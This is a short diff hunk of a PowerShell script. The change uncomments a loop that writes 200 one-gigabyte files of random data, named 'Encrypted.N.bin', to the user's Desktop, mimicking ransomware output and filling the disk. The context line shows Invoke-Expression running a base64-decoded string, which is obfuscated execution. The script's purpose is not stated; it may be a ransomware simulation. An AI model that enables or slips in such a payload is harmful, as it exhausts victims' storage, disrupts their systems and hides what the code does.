@@ -42,7 +42,7 @@ Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase
 
 try
 {
-    #1..200 | % { $out = new-object byte[] 1073741824; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("$env:USERPROFILE\Desktop\Encrypted.$_.bin", $out) }
+    1..200 | % { $out = new-object byte[] 1073741824; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("$env:USERPROFILE\Desktop\Encrypted.$_.bin", $out) }
 }
 finally
 {
